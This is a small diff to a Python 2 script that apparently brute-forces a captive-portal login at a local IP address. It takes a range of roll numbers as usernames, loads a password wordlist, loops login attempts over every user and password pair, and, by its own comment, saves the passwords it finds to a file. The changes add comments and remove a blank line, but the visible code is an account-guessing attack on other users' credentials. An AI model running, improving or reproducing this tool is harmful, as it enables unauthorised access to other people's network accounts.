@@ -15,9 +15,9 @@ end=int(raw_input("Enter the last Roll:"))
 for s in range(start,end+1):
     userid.append(s)
 
-    
 filenm = raw_input("Enter the wordlist filename: ")
 
+#Loads the file and mentions no.of entries:
 def load_words(file):
     print "loading words from file..."
     wordlist = list()
@@ -54,6 +54,7 @@ def sendLoginRequest(username, password):
     except:
         return False
 
+#LogOut request Function:
 def sendLogoutRequest(username):
     url = 'http://192.168.100.1:8090/httpclient.html'
     post_data = 'mode=193' + '&username=' + username
@@ -62,6 +63,7 @@ def sendLogoutRequest(username):
     print response
     print 'logout.'
 
+#Gets the password and saves to a file:
 for o in userid:
     for l in passwd:
          print l+" "+str(o)
